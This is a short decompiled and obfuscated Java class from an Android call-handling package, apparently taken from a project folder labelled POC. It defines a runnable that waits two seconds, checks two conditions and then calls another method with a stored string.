package com.vvt.callhandler;

import android.content.Context;
import android.os.SystemClock;
import com.vvt.aa.b;

class f
  implements Runnable
{
  f(c paramc, String paramString) {}
  
  public void run()
  {
    long l = 2000L;
    SystemClock.sleep(l);
    Object localObject = c.a(this.b);
    boolean bool1 = b.d((Context)localObject);
    boolean bool2 = c.e();
    if ((!bool2) || (bool1))
    {
      localObject = this.b;
      String str = this.a;
      c.a((c)localObject, str, false);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callhandler/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */